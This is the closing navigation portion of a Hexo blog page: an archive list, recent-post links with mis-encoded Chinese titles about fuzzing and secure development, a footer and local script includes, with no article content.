      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">October 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/08/">August 1999</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/01/">January 1999</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/10/01/hello-world/">Hello World</a>
          </li>
        
          <li>
            <a href="/2023/06/27/2023-06-27-fuzzer/">å¦‚ä½•å®Œæˆä¸€ä¸ª fuzzer</a>
          </li>
        
          <li>
            <a href="/2023/05/31/2023-05-31-report/">å®‰å…¨å¼€å‘</a>
          </li>
        
          <li>
            <a href="/2023/05/31/2023-06-18-fixandPR/">è®°ä¸€æ¬¡ fuzz go çš„ä¸€ä¸ªç¬¬ä¸‰æ–¹åº“</a>
          </li>
        
          <li>
            <a href="/2023/05/23/2023-05-23-waf/">AI å®‰å…¨ä¹‹</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>